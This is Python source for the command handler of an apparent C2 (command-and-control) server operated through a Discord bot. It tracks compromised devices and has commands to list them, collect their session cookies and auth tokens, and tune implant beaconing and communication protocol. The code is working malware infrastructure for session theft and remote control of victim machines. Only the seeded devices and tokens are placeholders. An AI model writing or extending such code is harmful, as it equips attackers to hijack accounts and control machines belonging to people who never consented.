"""
Command handler for the C2 server.
Processes commands received from the Discord bot via the message queue
and returns structured responses.
"""

import logging
from datetime import datetime, timezone
from typing import Any

from config import VALID_BEACON_INTERVALS, VALID_COMMUNICATION_PROTOCOLS
from models import (
    CommandMessage,
    CommandType,
    DeviceInfo,
    ResponseMessage,
    ResponseStatus,
    ServerConfig,
)

logger = logging.getLogger("c2-server.handler")


class CommandHandler:
    """Processes bot commands and manages server-side state."""

    def __init__(self) -> None:
        self.server_config = ServerConfig()
        self.devices: dict[str, DeviceInfo] = {}
        self.pending_tasks: list[dict[str, Any]] = []

        # Seed sample devices for demonstration.
        self._seed_sample_devices()

    def _seed_sample_devices(self) -> None:
        """Populate the device registry with sample data."""
        samples = [
            DeviceInfo(
                name="device-alpha",
                ip="192.168.1.10",
                status="online",
                cookies={"session_id": "abc123def456", "auth_token": "tok_7890xyz"},
            ),
            DeviceInfo(
                name="device-beta",
                ip="192.168.1.20",
                status="online",
                cookies={"tracking_id": "trk_001"},
            ),
            DeviceInfo(
                name="device-gamma",
                ip="192.168.1.30",
                status="offline",
                cookies={},
            ),
        ]
        for device in samples:
            self.devices[device.name] = device

    async def handle_command(self, raw_message: dict[str, Any]) -> dict[str, Any]:
        """
        Parse and dispatch a command message.
        Returns a serialised ResponseMessage dict.
        """
        try:
            command_msg = CommandMessage(**raw_message)
        except Exception as exc:
            logger.error("Failed to parse command: %s — %s", raw_message, exc)
            return {
                "request_id": raw_message.get("request_id", "unknown"),
                "command": raw_message.get("command", "unknown"),
                "status": ResponseStatus.ERROR,
                "data": {},
                "message": f"Invalid command format: {exc}",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

        logger.info(
            "Processing command: %s (request_id=%s)",
            command_msg.command.value,
            command_msg.request_id,
        )

        handler_map = {
            CommandType.SHOW_DEVICES: self._handle_show_devices,
            CommandType.REQUEST_COOKIES: self._handle_request_cookies,
            CommandType.SET_BEACON_INTERVAL: self._handle_set_beacon_interval,
            CommandType.SET_COMMUNICATION_PROTOCOL: self._handle_set_protocol,
        }

        handler = handler_map.get(command_msg.command)
        if handler is None:
            return ResponseMessage(
                request_id=command_msg.request_id,
                command=command_msg.command,
                status=ResponseStatus.ERROR,
                message=f"Unknown command: {command_msg.command}",
            ).model_dump(mode="json")

        return handler(command_msg)

    # ------------------------------------------------------------------
    # Individual command handlers
    # ------------------------------------------------------------------

    def _handle_show_devices(self, cmd: CommandMessage) -> dict[str, Any]:
        """Return the list of managed devices."""
        device_list = [
            {
                "name": d.name,
                "ip": d.ip,
                "status": d.status,
                "last_seen": d.last_seen.isoformat(),
            }
            for d in self.devices.values()
        ]
        return ResponseMessage(
            request_id=cmd.request_id,
            command=cmd.command,
            status=ResponseStatus.SUCCESS,
            data={"devices": device_list},
            message=f"Found {len(device_list)} device(s)",
        ).model_dump(mode="json")

    def _handle_request_cookies(self, cmd: CommandMessage) -> dict[str, Any]:
        """Collect and return cookies from all devices."""
        all_cookies: dict[str, dict[str, str]] = {}
        for device in self.devices.values():
            if device.cookies:
                all_cookies[device.name] = device.cookies

        total = sum(len(c) for c in all_cookies.values())
        return ResponseMessage(
            request_id=cmd.request_id,
            command=cmd.command,
            status=ResponseStatus.SUCCESS,
            data={"cookies_by_device": all_cookies},
            message=f"Retrieved {total} cookie(s) from {len(all_cookies)} device(s)",
        ).model_dump(mode="json")

    def _handle_set_beacon_interval(self, cmd: CommandMessage) -> dict[str, Any]:
        """Update the beacon interval."""
        interval = cmd.args.get("interval")
        if interval is None:
            return self._error_response(
                cmd, "Missing required argument: interval"
            )

        try:
            interval = int(interval)
        except (ValueError, TypeError):
            return self._error_response(
                cmd, f"Invalid interval value: {interval}"
            )

        if interval not in VALID_BEACON_INTERVALS:
            allowed = ", ".join(str(v) for v in VALID_BEACON_INTERVALS)
            return self._error_response(
                cmd,
                f"Invalid beacon interval {interval}. Allowed: {allowed}",
            )

        self.server_config.beacon_interval = interval
        logger.info("Beacon interval updated to %d seconds", interval)
        return ResponseMessage(
            request_id=cmd.request_id,
            command=cmd.command,
            status=ResponseStatus.SUCCESS,
            data={"beacon_interval": interval},
            message=f"Beacon interval set to {interval} seconds",
        ).model_dump(mode="json")

    def _handle_set_protocol(self, cmd: CommandMessage) -> dict[str, Any]:
        """Update the communication protocol."""
        protocol = cmd.args.get("protocol")
        if protocol is None:
            return self._error_response(
                cmd, "Missing required argument: protocol"
            )

        protocol_lower = str(protocol).lower()
        if protocol_lower not in VALID_COMMUNICATION_PROTOCOLS:
            allowed = ", ".join(VALID_COMMUNICATION_PROTOCOLS)
            return self._error_response(
                cmd,
                f"Invalid protocol '{protocol}'. Allowed: {allowed}",
            )

        self.server_config.communication_protocol = protocol_lower
        logger.info("Communication protocol updated to %s", protocol_lower)
        return ResponseMessage(
            request_id=cmd.request_id,
            command=cmd.command,
            status=ResponseStatus.SUCCESS,
            data={"communication_protocol": protocol_lower},
            message=f"Communication protocol set to {protocol_lower}",
        ).model_dump(mode="json")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _error_response(
        self, cmd: CommandMessage, message: str
    ) -> dict[str, Any]:
        """Build a standardised error response."""
        return ResponseMessage(
            request_id=cmd.request_id,
            command=cmd.command,
            status=ResponseStatus.ERROR,
            message=message,
        ).model_dump(mode="json")

    def register_device(self, device: DeviceInfo) -> None:
        """Register or update a device in the registry."""
        device.last_seen = datetime.now(timezone.utc)
        self.devices[device.name] = device
        logger.info("Device registered/updated: %s (%s)", device.name, device.ip)

    def get_device(self, name: str) -> DeviceInfo | None:
        """Look up a device by name."""
        return self.devices.get(name)
